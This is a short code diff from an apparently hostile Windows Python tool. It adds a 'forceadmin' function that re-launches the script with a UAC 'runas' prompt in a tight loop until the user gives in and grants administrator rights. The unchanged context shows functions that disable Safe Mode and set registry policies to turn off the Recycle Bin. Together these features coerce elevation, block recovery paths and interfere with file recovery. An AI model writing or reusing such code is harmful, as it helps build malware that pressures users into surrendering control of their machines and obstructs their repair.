@@ -1,9 +1,4 @@
-import winreg 
-import time
-import psutil
-import os
-import subprocess
-import threading
+import ctypes, sys, os, subprocess, threading, psutil, time, winreg
 
 def disable_safe_mode():
     try:
@@ -144,3 +139,12 @@ def norecy():
 
 def yesrecy():
     subprocess.run(r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecycleFiles /f', shell=True)    
+def forceadmin():
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return
+    while True:
+        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
+        if result <= 32:
+            time.sleep(0.01)
+        else:
+            return    
